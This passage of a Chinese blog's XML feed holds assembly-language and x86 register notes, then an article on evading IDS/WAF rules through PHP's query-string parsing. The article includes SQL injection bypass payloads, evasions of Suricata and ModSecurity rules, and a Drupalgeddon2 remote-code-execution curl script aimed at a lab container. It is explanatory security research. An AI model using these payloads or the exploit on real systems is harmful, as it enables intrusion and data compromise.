id="TYPE"><a href="#TYPE" class="headerlink" title="TYPE"></a>TYPE</h3><pre class=" language-c++"><code class="language-c++">var word ?var2 byte ?; word,byte都是type,分别代表2,1</code></pre><h3 id="LENGTHOF-————–运算符"><a href="#LENGTHOF-————–运算符" class="headerlink" title="LENGTHOF ————–运算符"></a>LENGTHOF ————–运算符</h3><pre class=" language-c++"><code class="language-c++">var1 byte 10,20,30;3var2 word 30 DUP(?),0,0;32var3 word 5 DUP(3 dup(?));3*5var4 byte "1234",0;5</code></pre><h3 id="SIZFEOF————-运算符"><a href="#SIZFEOF————-运算符" class="headerlink" title="SIZFEOF————-运算符"></a>SIZFEOF————-运算符</h3><pre class=" language-c++"><code class="language-c++">var word 32 dup(0)mov eax,sizeof var;eax=32*2=64</code></pre><h3 id="LABEL-—————伪指令"><a href="#LABEL-—————伪指令" class="headerlink" title="LABEL —————伪指令"></a>LABEL —————伪指令</h3><pre class=" language-c++"><code class="language-c++">var1 label wordvar2 dword 12345678h;公用一个内存位置，var2未分配空间mov ax,var1;5678hmov dx,[var+2];1234h</code></pre><h3 id="TYPEDEF————–运算符"><a href="#TYPEDEF————–运算符" class="headerlink" title="TYPEDEF————–运算符"></a>TYPEDEF————–运算符</h3><pre class=" language-c++"><code class="language-c++">var typedef ptr byte;(指针).data    array byte 10h,20h,30h    ptr1 var ?    ptr2 var array;指向一个数组</code></pre><h3 id="JMP-————无条件跳转到目标地址"><a href="#JMP-————无条件跳转到目标地址" class="headerlink" title="JMP ————无条件跳转到目标地址"></a>JMP ————无条件跳转到目标地址</h3><pre class=" language-c++"><code class="language-c++">top:..    jmp top;不断循环</code></pre><h3 id="USES—————等于-push-pop"><a href="#USES—————等于-push-pop" class="headerlink" title="USES—————等于 push+pop"></a>USES—————等于 push+pop</h3><pre class=" language-c++"><code class="language-c++">ArraySum proc uses esi ecx    mov eax,0L1:    add eax,[esi]    add esi,type dword    loop L1ArraySum endp</code></pre><h3 id="CLC"><a href="#CLC" class="headerlink" title="CLC"></a>CLC</h3><pre class=" language-c++"><code class="language-c++">clc;清除标识位</code></pre><h3 id="STC"><a href="#STC" class="headerlink" title="STC"></a>STC</h3><pre><code>进位标志置1</code></pre><h3 id="ENTER——————-被调用过程自动创建堆栈帧"><a href="#ENTER——————-被调用过程自动创建堆栈帧" class="headerlink" title="ENTER——————-被调用过程自动创建堆栈帧"></a>ENTER——————-被调用过程自动创建堆栈帧</h3><pre><code>Mysub proc    enter 8,0;等效于Mysub proc    push ebp    mov ebp,esp    sub esp,8</code></pre><h3 id="LEAVE——————指令结束一个过程的堆栈帧"><a href="#LEAVE——————指令结束一个过程的堆栈帧" class="headerlink" title="LEAVE——————指令结束一个过程的堆栈帧"></a>LEAVE——————指令结束一个过程的堆栈帧</h3><pre><code>Mysub proc    enter 8,0    .    .    leave    retMysub endp;等效于Mysub proc    push ebp    mov ebp,esp    sub esp,8    .    .    mov esp,ebp    pop ebp    retMysub endp</code></pre><h3 id="LOCAL—————局部变量"><a href="#LOCAL—————局部变量" class="headerlink" title="LOCAL—————局部变量"></a>LOCAL—————局部变量</h3><pre><code>Mysub proc    local var:dword;这是一个局部变量</code></pre><h3 id="INVOKE—————–CALL替代品，一行调用多个参数"><a href="#INVOKE—————–CALL替代品，一行调用多个参数" class="headerlink" title="INVOKE—————–CALL替代品，一行调用多个参数"></a>INVOKE—————–CALL替代品，一行调用多个参数</h3><pre><code>invoke Dumparray,offset array,lengthof array,type array</code></pre><h3 id="ADDR——–只能和INVOKE一起"><a href="#ADDR——–只能和INVOKE一起" class="headerlink" title="ADDR——–只能和INVOKE一起"></a>ADDR——–只能和INVOKE一起</h3><pre><code>array dword 20 dup(?)invoke swap    addr array    addr [array+4]</code></pre><h2 id="条件标志"><a href="#条件标志" class="headerlink" title="条件标志"></a>条件标志</h2><h3 id="ZF-零标志"><a href="#ZF-零标志" class="headerlink" title="ZF 零标志"></a>ZF 零标志</h3><pre class=" language-c++"><code class="language-c++">当结果为负时,SF=1,否则,SF=0</code></pre><h3 id="AF-辅助进位标志"><a href="#AF-辅助进位标志" class="headerlink" title="AF 辅助进位标志"></a>AF 辅助进位标志</h3><pre class=" language-c++"><code class="language-c++">运算过程中第三位有进位值,置AF=1,否则,AF=0</code></pre><h3 id="PF-奇偶标志"><a href="#PF-奇偶标志" class="headerlink" title="PF 奇偶标志"></a>PF 奇偶标志</h3><pre class=" language-c++"><code class="language-c++">当结果操作数中偶数个"1",置PF=1,否则,PF=0</code></pre><h3 id="SF-符号标志"><a href="#SF-符号标志" class="headerlink" title="SF 符号标志"></a>SF 符号标志</h3><pre class=" language-c++"><code class="language-c++">当结果为负时,SF=1;否则,SF=0.溢出时情形例外</code></pre><h3 id="CF-进位标志"><a href="#CF-进位标志" class="headerlink" title="CF 进位标志"></a>CF 进位标志</h3><pre class=" language-c++"><code class="language-c++">最高有效位产生进位值,例如,执行加法指令时,MSB有进位,置CF=1;否则,CF=0</code></pre><h3 id="OF-溢出标志"><a href="#OF-溢出标志" class="headerlink" title="OF 溢出标志"></a>OF 溢出标志</h3><pre class=" language-c++"><code class="language-c++">若操作数结果超出了机器能表示的范围,则产生溢出,置OF=1,否则,OF=0</code></pre>]]></content>
      
      
      <categories>
          
          <category> 语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寄存器</title>
      <link href="2021/01/01/ji-cun-qi/"/>
      <url>2021/01/01/ji-cun-qi/</url>
      
        <content type="html"><![CDATA[<h2 id="32位CPU所含有的寄存器有："><a href="#32位CPU所含有的寄存器有：" class="headerlink" title="32位CPU所含有的寄存器有："></a>32位CPU所含有的寄存器有：</h2><ol><li>4个数据寄存器(EAX、EBX、ECX和EDX) </li><li>2个变址和指针寄存器(ESI和EDI) </li><li>2个指针寄存器(ESP和EBP)  </li><li>6个段寄存器(ES、CS、SS、DS、FS和GS) </li><li>1个指令指针寄存器(EIP) 1个标志寄存器(EFlags)  </li></ol><h1 id="1、数据寄存器"><a href="#1、数据寄存器" class="headerlink" title="1、数据寄存器"></a>1、数据寄存器</h1><p>数据寄存器主要用来保存操作数和运算结果等信息，从而节省读取操作数所需占用总线和访问存储器的时间。 </p><ul><li><p>32位CPU有4个32位的通用寄存器EAX、EBX、ECX和EDX。 </p></li><li><p>对低16位数据的存取，不会影响高16位的数据。 这些低16位寄存器分别命名为：AX、BX、CX和DX，它和先前的CPU中的寄存器相一致。 </p></li><li><p>4个16位寄存器又可分割成8个独立的8位寄存器(AX：AH-AL、BX：BH-BL、CX：CH-CL、DX：DH-DL)，每个寄存器都有自己的名称，可独立存取。 程序员可利用数据寄存器的这种“可分可合”的特性，灵活地处理字/字节的信息。  </p></li><li><p>寄存器EAX通常称为累加器(Accumulator)，用累加器进行的操作可能需要更少时间。可用于乘、 除、输入/输出等操作，使用频率很高；  </p></li><li><p>寄存器EBX称为基地址寄存器(Base Register)。它可作为存储器指针来使用；  </p></li><li><p>寄存器ECX称为计数寄存器(Count Register)。 在循环和字符串操作时，要用它来控制循环次数；在位操作中，当移多位时，要用CL来指明移位的位数；  </p></li><li><p>寄存器EDX称为数据寄存器(Data Register)。在进行乘、除运算时，它可作为默认的操作数参与运算，也可用于存放I/O的端口地址。  </p></li></ul><p>在16位CPU中，AX、BX、CX和DX不能作为基址和变址寄存器来存放存储单元的地址， </p><p>在32位CPU中，其32位寄存器EAX、EBX、ECX和EDX不仅可传送数据、暂存数据保存算术逻辑运算结果， 而且也可作为指针寄存器，所以，这些32位寄存器更具有通用性。 </p><h1 id="2、变址寄存器"><a href="#2、变址寄存器" class="headerlink" title="2、变址寄存器"></a>2、变址寄存器</h1><p>32位CPU有2个32位通用寄存器ESI和EDI。 </p><p>其低16位对应先前CPU中的SI和DI，对低16位数据的存取，不影响高16位的数据。 </p><p>寄存器ESI、EDI、SI和DI称为变址寄存器(Index Register)，它们主要用于存放存储单元在段内的偏移量， 用它们可实现多种存储器操作数的寻址方式，为以不同的地址形式访问存储单元提供方便。 </p><p>变址寄存器不可分割成8位寄存器。作为通用寄存器，也可存储算术逻辑运算的操作数和运算结果。 </p><p>它们可作一般的存储器指针使用。在字符串操作指令的执行过程中，对它们有特定的要求，而且还具有特殊的功能。 </p><h1 id="3、指针寄存器"><a href="#3、指针寄存器" class="headerlink" title="3、指针寄存器"></a>3、指针寄存器</h1><p>其低16位对应先前CPU中的BP和SP，对低16位数据的存取，不影响高16位的数据。 </p><p>32位CPU有2个32位通用寄存器EBP和ESP。 </p><p>它们主要用于访问堆栈内的存储单元，并且规定： </p><ul><li>EBP为基指针(Base Pointer)寄存器，用它可直接存取堆栈中的数据；  </li><li>ESP为堆栈指针(Stack Pointer)寄存器，用它只可访问栈顶。 </li></ul><p>寄存器EBP、ESP、BP和SP称为指针寄存器(Pointer Register)，主要用于存放堆栈内存储单元的偏移量， 用它们可实现多种存储器操作数的寻址方式，为以不同的地址形式访问存储单元提供方便。 </p><p>指针寄存器不可分割成8位寄存器。作为通用寄存器，也可存储算术逻辑运算的操作数和运算结果。 </p><h1 id="4、段寄存器"><a href="#4、段寄存器" class="headerlink" title="4、段寄存器"></a>4、段寄存器</h1><p>段寄存器是根据内存分段的管理模式而设置的。内存单元的物理地址由段寄存器的值和一个偏移量组合而成的，这样可用两个较少位数的值组合成一个可访问较大物理空间的内存地址。 </p><p>CPU内部的段寄存器： </p><ol><li>ECS——代码段寄存器(Code Segment Register)，其值为代码段的段值；  </li><li>EDS——数据段寄存器(Data Segment Register)，其值为数据段的段值；  </li><li>EES——附加段寄存器(Extra Segment Register)，其值为附加数据段的段值；  </li><li>ESS——堆栈段寄存器(Stack Segment Register)，其值为堆栈段的段值；  </li><li>EFS——附加段寄存器(Extra Segment Register)，其值为附加数据段的段值；  </li><li>EGS——附加段寄存器(Extra Segment Register)，其值为附加数据段的段值。  </li><li></li></ol><ul><li>在16位CPU系统中，它只有4个段寄存器，所以，程序在任何时刻至多有4个正在使用的段可直接访问；</li><li>在32位微机系统中，它有6个段寄存器，所以，在此环境下开发的程序最多可同时访问6个段。 </li></ul><p>32位CPU有两个不同的工作方式：实方式和保护方式。在每种方式下，段寄存器的作用是不同的。有关规定简 单描述如下： </p><ul><li><p>实方式： 前4个段寄存器CS、DS、ES和SS与先前CPU中的所对应的段寄存器的含义完全一致，内存单元的逻辑地址仍为“段值：偏移量”的形式。为访问某内存段内的数据，必须使用该段寄存器和存储单元的偏移量。  </p></li><li><p>保护方式： 在此方式下，情况要复杂得多，装入段寄存器的不再是段值，而是称为“选择子”(Selector)的某个值。</p></li></ul><h1 id="5、指令指针寄存器"><a href="#5、指令指针寄存器" class="headerlink" title="5、指令指针寄存器"></a>5、指令指针寄存器</h1><p>32位CPU把指令指针扩展到32位，并记作EIP，EIP的低16位与先前CPU中的IP作用相同。 </p><p>指令指针EIP、IP(Instruction Pointer)是存放下次将要执行的指令在代码段的偏移量。 </p><p>在具有预取指令功能的系统中，下次要执行的指令通常已被预取到指令队列中，除非发生转移情况。 </p><p>所以，在理解它们的功能时，不考虑存在指令队列的情况。 </p><h1 id="6、标志寄存器"><a href="#6、标志寄存器" class="headerlink" title="6、标志寄存器"></a>6、标志寄存器</h1><h2 id="一、运算结果标志位"><a href="#一、运算结果标志位" class="headerlink" title="一、运算结果标志位"></a>一、运算结果标志位</h2><h3 id="1、进位标志CF-Carry-Flag"><a href="#1、进位标志CF-Carry-Flag" class="headerlink" title="1、进位标志CF(Carry Flag)"></a>1、进位标志CF(Carry Flag)</h3><p>进位标志CF主要用来反映运算是否产生进位或借位。如果运算结果的最高位产生了一个进位或借位，那么，其值为1，否则其值为0。 </p><p>使用该标志位的情况有：多字(字节)数的加减运算，无符号数的大小比较运算，移位操作，字(字节)之间移位，专门改变CF值的指令等。 </p><h3 id="2、奇偶标志PF-Parity-Flag"><a href="#2、奇偶标志PF-Parity-Flag" class="headerlink" title="2、奇偶标志PF(Parity Flag)"></a>2、奇偶标志PF(Parity Flag)</h3><p>奇偶标志PF用于反映运算结果中“1”的个数的奇偶性。如果“1”的个数为偶数，则PF的值为1，否则其值为0。 </p><p>利用PF可进行奇偶校验检查，或产生奇偶校验位。在数据传送过程中，为了提供传送的可靠性，如果采用奇偶校验的方法，就可使用该标志位。 </p><h3 id="3、辅助进位标志AF-Auxiliary-Carry-Flag"><a href="#3、辅助进位标志AF-Auxiliary-Carry-Flag" class="headerlink" title="3、辅助进位标志AF(Auxiliary Carry Flag)"></a>3、辅助进位标志AF(Auxiliary Carry Flag)</h3><p>在发生下列情况时，辅助进位标志AF的值被置为1，否则其值为0： </p><ol><li>在字操作时，发生低字节向高字节进位或借位时； </li><li>在字节操作时，发生低4位向高4位进位或借位时。 </li></ol><p>对以上6个运算结果标志位，在一般编程情况下，标志位CF、ZF、SF和OF的使用频率较高，而标志位PF和AF的使用频率较低。 </p><h3 id="4、零标志ZF-Zero-Flag"><a href="#4、零标志ZF-Zero-Flag" class="headerlink" title="4、零标志ZF(Zero Flag)"></a>4、零标志ZF(Zero Flag)</h3><p>零标志ZF用来反映运算结果是否为0。如果运算结果为0，则其值为1，否则其值为0。在判断运算结果是否为0时，可使用此标志位。 </p><h3 id="5、符号标志SF-Sign-Flag"><a href="#5、符号标志SF-Sign-Flag" class="headerlink" title="5、符号标志SF(Sign Flag)"></a>5、符号标志SF(Sign Flag)</h3><p>符号标志SF用来反映运算结果的符号位，它与运算结果的最高位相同。在微机系统中，有符号数采用码表示法，所以，SF也就反映运算结果的正负号。运算结果为正数时，SF的值为0，否则其值为1。 </p><h3 id="6、溢出标志OF-Overflow-Flag"><a href="#6、溢出标志OF-Overflow-Flag" class="headerlink" title="6、溢出标志OF(Overflow Flag)"></a>6、溢出标志OF(Overflow Flag)</h3><p>溢出标志OF用于反映有符号数加减运算所得结果是否溢出。如果运算结果超过当前运算位数所能表示的范围，则称为溢出，OF的值被置为1，否则，OF的值被清为0。 “</p><p>溢出”和“进位”是两个不同含义的概念，不要混淆。</p><h2 id="二、状态控制标志位"><a href="#二、状态控制标志位" class="headerlink" title="二、状态控制标志位"></a>二、状态控制标志位</h2><p>状态控制标志位是用来控制CPU操作的，它们要通过专门的指令才能使之发生改变。 </p><h2 id="1、追踪标志TF-Trap-Flag"><a href="#1、追踪标志TF-Trap-Flag" class="headerlink" title="1、追踪标志TF(Trap Flag)"></a>1、追踪标志TF(Trap Flag)</h2><p>当追踪标志TF被置为1时，CPU进入单步执行方式，即每执行一条指令，产生一个单步中断请求。这种方式主要用于程序的调试。 指令系统中没有专门的指令来改变标志位TF的值，但程序员可用其它办法来改变其值。 </p><h3 id="2、中断允许标志IF-Interrupt-enable-Flag"><a href="#2、中断允许标志IF-Interrupt-enable-Flag" class="headerlink" title="2、中断允许标志IF(Interrupt-enable Flag)"></a>2、中断允许标志IF(Interrupt-enable Flag)</h3><p>中断允许标志IF是用来决定CPU是否响应CPU外部的可屏蔽中断发出的中断请求。 但不管该标志为何值，CPU都必须响应CPU外部的不可屏蔽中断所发出的中断请求，以及CPU内部产生的中断请求。 具体规定如下： </p><ol><li>当IF=1时，CPU可以响应CPU外部的可屏蔽中断发出的中断请求； </li><li>当IF=0时，CPU不响应CPU外部的可屏蔽中断发出的中断请求。 CPU的指令系统中也有专门的指令来改变标志位IF的值。 </li></ol><h3 id="3、方向标志DF-Direction-Flag"><a href="#3、方向标志DF-Direction-Flag" class="headerlink" title="3、方向标志DF(Direction Flag)"></a>3、方向标志DF(Direction Flag)</h3><p>方向标志DF用来决定在串操作指令执行时有关指针寄存器发生调整的方向。 在微机的指令系统中，还提供了专门的指令来改变标志位DF的值。 </p><h2 id="三、32位标志寄存器增加的标志位"><a href="#三、32位标志寄存器增加的标志位" class="headerlink" title="三、32位标志寄存器增加的标志位"></a>三、32位标志寄存器增加的标志位</h2><h3 id="1、I-O特权标志IOPL-I-O-Privilege-Level"><a href="#1、I-O特权标志IOPL-I-O-Privilege-Level" class="headerlink" title="1、I/O特权标志IOPL(I/O Privilege Level)"></a>1、I/O特权标志IOPL(I/O Privilege Level)</h3><p>I/O特权标志用两位二进制位来表示，也称为I/O特权级字段。该字段指定了要求执行I/O指令的特权级。 如果当前的特权级别在数值上小于等于IOPL的值，那么，该I/O指令可执行，否则将发生一个保护异常。 </p><h3 id="2、嵌套任务标志NT-Nested-Task"><a href="#2、嵌套任务标志NT-Nested-Task" class="headerlink" title="2、嵌套任务标志NT(Nested Task)"></a>2、嵌套任务标志NT(Nested Task)</h3><p>嵌套任务标志NT用来控制中断返回指令IRET的执行。具体规定如下： </p><ol><li>当NT=0，用堆栈中保存的值恢复EFLAGS、CS和EIP，执行常规的中断返回操作； </li><li>当NT=1，通过任务转换实现中断返回。 </li></ol><h3 id="3、重启动标志RF-Restart-Flag"><a href="#3、重启动标志RF-Restart-Flag" class="headerlink" title="3、重启动标志RF(Restart Flag)"></a>3、重启动标志RF(Restart Flag)</h3><p>重启动标志RF用来控制是否接受调试故障。规定：RF=0时，表示“接受”调试故障，否则拒绝之。 在成功执行完一条指令后，处理机把RF置为0，当接受到一个非调试故障时，处理机就把它置为1。 </p><h3 id="4、虚拟8086方式标志VM-Virtual-8086-Mode"><a href="#4、虚拟8086方式标志VM-Virtual-8086-Mode" class="headerlink" title="4、虚拟8086方式标志VM(Virtual 8086 Mode)"></a>4、虚拟8086方式标志VM(Virtual 8086 Mode)</h3><p>如果该标志的值为1，则表示处理机处于虚拟的8086方式下的工作状态，否则，处理机处于一般保护方式下的工作状态。 </p>]]></content>
      
      
      <categories>
          
          <category> 语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用PHP的字符串解析特性Bypass</title>
      <link href="2020/09/05/php-de-zi-fu-chuan-jie-xi-te-xing/"/>
      <url>2020/09/05/php-de-zi-fu-chuan-jie-xi-te-xing/</url>
      
        <content type="html"><![CDATA[<h2 id="利用PHP的字符串解析特性Bypass"><a href="#利用PHP的字符串解析特性Bypass" class="headerlink" title="利用PHP的字符串解析特性Bypass"></a>利用PHP的字符串解析特性Bypass</h2><p>我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p><pre class=" language-php"><code class="language-php"><span class="token operator">/</span>news<span class="token punctuation">.</span>php<span class="token operator">?</span><span class="token operator">%</span>20news<span class="token punctuation">[</span>id<span class="token operator">%</span><span class="token number">00</span><span class="token operator">=</span><span class="token number">42</span>"<span class="token operator">+</span><span class="token keyword">AND</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">0</span><span class="token operator">--</span></code></pre><p>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</p><p>HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p><ol><li>删除空白符</li><li>将某些字符转换为下划线（包括空格）</li></ol><p>例如：</p><table><thead><tr><th align="center">User input</th><th align="center">Decoded PHP</th><th align="center">variable name</th></tr></thead><tbody><tr><td align="center">%20foo_bar%00</td><td align="center">foo_bar</td><td align="center">foo_bar</td></tr><tr><td align="center">foo%20bar%00</td><td align="center">foo bar</td><td align="center">foo_bar</td></tr><tr><td align="center">foo%5bbar</td><td align="center">foo[bar</td><td align="center">foo_bar</td></tr></tbody></table><p>通过以下这个示例，你可以更直观的看到parser_str函数如何处理字符串：</p><p><img src="https://s3.ax1x.com/2021/03/03/6EyIW4.gif" alt="6EyIW4.gif"></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span>        <span class="token punctuation">[</span>            <span class="token string">"&amp;#123;chr&amp;#125;foo_bar"</span><span class="token punctuation">,</span>            <span class="token string">"foo&amp;#123;chr&amp;#125;bar"</span><span class="token punctuation">,</span>            <span class="token string">"foo_bar&amp;#123;chr&amp;#125;"</span>        <span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;=</span><span class="token number">255</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>                <span class="token keyword">echo</span> <span class="token string">"\033[999D\033[K\r"</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token string">"["</span><span class="token punctuation">.</span><span class="token variable">$arg</span><span class="token punctuation">.</span><span class="token string">"] check "</span><span class="token punctuation">.</span><span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">""</span><span class="token punctuation">;</span>                <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"&amp;#123;chr&amp;#125;"</span><span class="token punctuation">,</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"=bla"</span><span class="token punctuation">,</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">/* yes... I've added a sleep time on each loop just for                 the scenic effect :) like that movie with unrealistic                 brute-force where the password are obtained                 one byte at a time (∩｀-´)⊃━☆ﾟ.*･｡ﾟ                 */</span>                <span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">[</span><span class="token string">"foo_bar"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>                    <span class="token keyword">echo</span> <span class="token string">"\033[999D\033[K\r"</span><span class="token punctuation">;</span>                    <span class="token keyword">echo</span> <span class="token variable">$arg</span><span class="token punctuation">.</span><span class="token string">" -> "</span><span class="token punctuation">.</span><span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">" ("</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">")\n"</span><span class="token punctuation">;</span>                <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>            <span class="token keyword">echo</span> <span class="token string">"\033[999D\033[K\r"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre><p><img src="https://s3.ax1x.com/2021/03/03/6EyHyR.gif" alt="6EyHyR.gif"></p><p>parse_str函数通常被自动应用于get、post请求和cookie中。如果你的Web服务器接受带有特殊字符的参数名，那么也会发生类似的情况。如上代码所示，我进行了多次循环，枚举了参数名三个位置的0到255之间的所有字符，看看解析函数到底是如何处理这些特殊字符的。结果如下：</p><ol><li><p>[1st]foo_bar  </p></li><li><p>foo[2nd]bar    </p></li><li><p>foo_bar[3rd]</p></li></ol><p><img src="https://s3.ax1x.com/2021/03/03/6EyLex.jpg" alt="6EyLex.jpg"></p><p><img src="https://s3.ax1x.com/2021/03/03/6EyxYD.jpg" alt="6EyxYD.jpg"></p><p>在上述方案中，foo%20bar和foo+bar等效，均解析为foo bar。</p><h2 id="Suricata"><a href="#Suricata" class="headerlink" title="Suricata"></a>Suricata</h2><p>也许你也听过这款软件，Suricata是一个“开源、成熟、快速、强大的网络威胁检测引擎”，它的引擎能够进行实时入侵检测（IDS）、入侵防御系统（IPS）、网络安全监控（NSM）和离线流量包处理。</p><p>在Suricata中你可以自定义一个HTTP流量的检测规则。假设你有这样一个规则：</p><pre><code>alert http any any -&gt; $HOME_NET any (\    msg: &quot;Block SQLi&quot;; flow:established,to_server;\    content: &quot;POST&quot;; http_method;\    pcre: &quot;/news_id=[^0-9]+/Pi&quot;;\    sid:1234567;\)</code></pre><p>简单来说，上述规则会检查news_id的值是否是数字。那么根据上述知识，我们可以很容易的绕过防御，如下所示：</p><pre><code>/?news[id=1%22+AND+1=1--&#39;/?news%5bid=1%22+AND+1=1--&#39;/?news_id%00=1%22+AND+1=1--&#39;</code></pre><p>通过在Google和Github上进行搜索，我发现有很多关于Suricata规则可以通过替换下划线或插入空字符来绕过。一个真实的例子：<a href="https://github.com/OISF/suricata-update/blob/7797d6ab0c00051ce4be5ee7ee4120e81f1138b4/tests/emerging-current_events.rules#L805">https://github.com/OISF/suricata-update/blob/7797d6ab0c00051ce4be5ee7ee4120e81f1138b4/tests/emerging-current_events.rules#L805</a></p><pre><code>alert http $HOME_NET any -&gt; $EXTERNAL_NET any (msg:&quot;ET CURRENT_EVENTS Sakura exploit kit exploit download request /view.php&quot;; flow:established,to_server; content:&quot;/view.php?i=&quot;; http_uri; fast_pattern:only; pcre:&quot;//view.php?i=\d&amp;key=[0-9a-f]&#123;32&#125;$/U&quot;; classtype:trojan-activity; sid:2015678; rev:2;)</code></pre><p>上述规则可以通过以下方式绕过：</p><pre><code>/view.php?i%00=1&amp;%20key=d3b07384d113edec49eaa6238ad5ff00</code></pre><p>当然，这条规则交换参数位置即可绕过，比如：</p><pre><code>/view.php?key=d3b07384d113edec49eaa6238ad5ff00&amp;i=1</code></pre><h2 id="WAF（ModSecurity）"><a href="#WAF（ModSecurity）" class="headerlink" title="WAF（ModSecurity）"></a>WAF（ModSecurity）</h2><p>此外，PHP查询字符串的解析特性也可用以绕过WAF。想象一下,它的规则类似于SecRule !ARGS:news_id “@rx ^[0-9]+$” “block”，这显然可以通过相同的手段绕过。幸运的是，在ModSecurity中，可以通过正则表达式指定查询字符串中的参数。比如：</p><pre><code>SecRule !ARGS:/news.id/ &quot;@rx ^[0-9]+$&quot; &quot;block&quot;</code></pre><p>以上规则将拦截诸如以下的请求：</p><pre><code>⛔️/?news[id=1%22+AND+1=1--&#39;⛔️/?news%5bid=1%22+AND+1=1--&#39;⛔️/?news_id%00=1%22+AND+1=1--&#39;</code></pre><h2 id="PoC-GTFO"><a href="#PoC-GTFO" class="headerlink" title="PoC || GTFO"></a>PoC || GTFO</h2><p>让我们用Suricata和Drupal CMS创建一个以利用<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7600">CVE-2018-7600</a>（Drupalgeddon2远程执行代码）的简单PoC。为了简单起见，我将在两个Docker容器上运行Suricata和Drupal，并尝试绕过Suricata攻击Drupal。</p><p>我将使用两条Suricata防御规则：</p><blockquote><p>​    1.一条自定义规则拦截form_id=user_register_form</p><p>​    2.另一条是关于CVE-2018-7600的通用<a href="https://github.com/ptresearch/AttackDetection/tree/master/CVE-2018-7600">规则</a></p></blockquote><p><img src="/2020/09/05/php-de-zi-fu-chuan-jie-xi-te-xing/blog\source\picture\1567560463_5d6f130fe4b66.png!small" alt="img"></p><p>Suricata官方安装流程点击<a href="https://redmine.openinfosecfoundation.org/projects/suricata/wiki/Ubuntu_Installation_-_Personal_Package_Archives_(PPA)%E3%80%82%E5%AF%B9%E4%BA%8EDrupal%EF%BC%8C%E6%88%91%E8%BF%90%E8%A1%8C%E4%BA%86%E4%B8%80%E4%B8%AAVulhub%E5%AE%B9%E5%99%A8%EF%BC%8C%E4%BD%A0%E5%8F%AF%E4%BB%A5%E5%9C%A8[%E8%BF%99%E9%87%8C](https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2018-7600">这里</a>下载：</p><p><img src="https://s3.ax1x.com/2021/03/03/6Eyzfe.jpg" alt="6Eyzfe.jpg"></p><p>首先，让我们尝试利用CVE-2018-7600。一个利用curl命令的小型bash脚本，比如：</p><pre><code>#!/bin/bashURL=&quot;/user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax&quot;QSTRING=&quot;form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=&quot;COMMAND=&quot;id&quot;curl -v -d &quot;$&#123;QSTRING&#125;$&#123;COMMAND&#125;&quot; &quot;http://172.17.0.1:8080$URL&quot;</code></pre><p>如你所见，上面的脚本将执行命令id：</p><p><img src="https://s3.ax1x.com/2021/03/03/6E6POI.jpg" alt="6E6POI.jpg"></p><p>现在，让我们尝试往Suricata导入以下两条规则：我编写了第一个规则，它只是尝试form_id=user_register_form在请求体内进行匹配; Positive Technology /user/register在请求URL和#post_render请求正文中写了第二个匹配项。我的规则：</p><pre><code>alert http any any -&gt; $HOME_NET any (\  msg: &quot;Possible Drupalgeddon2 attack&quot;;\  flow: established, to_server;\  content: &quot;/user/register&quot;; http_uri;\ 